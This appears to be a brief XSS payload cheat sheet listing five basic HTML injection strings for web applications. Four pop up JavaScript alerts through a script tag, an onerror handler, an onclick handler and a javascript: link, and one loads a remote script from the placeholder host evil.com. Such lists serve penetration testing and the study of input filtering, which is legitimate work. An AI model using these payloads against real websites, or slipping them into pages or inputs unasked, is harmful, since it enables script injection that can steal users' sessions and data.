### Basic
```html
<script>alert("XSS")</script>
<script src="https://evil.com/a.js"></script>
<img src="x" onerror="alert(1234)">
<button onclick="alert(1234)">CLICK ME</button>
<a href="javascript:alert(777)">CLICK ME</a>
```